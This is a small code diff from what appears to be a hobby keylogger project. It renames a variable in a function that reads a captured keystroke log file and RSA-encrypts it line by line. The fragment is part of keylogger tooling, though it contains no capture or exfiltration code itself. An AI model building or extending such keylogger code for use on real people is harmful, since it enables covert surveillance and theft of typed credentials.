@@ -5,11 +5,11 @@ def encrypt(publickey):
     # Opens log file
     log_file = open(
         r"C:\Users\Badger\Documents\GitHub\Simple_Keylogger\Log\clean_key_log.txt", "r")
-    Lines = log_file.readlines()
+    lines = log_file.readlines()
 
     # Encrypts log line by line and appends to the enc_log
     enc_log = []
-    for line in Lines:
+    for line in lines:
         encrypted = rsa.encrypt(line.encode(), publickey)
         enc_log.append(encrypted)
     print(enc_log)
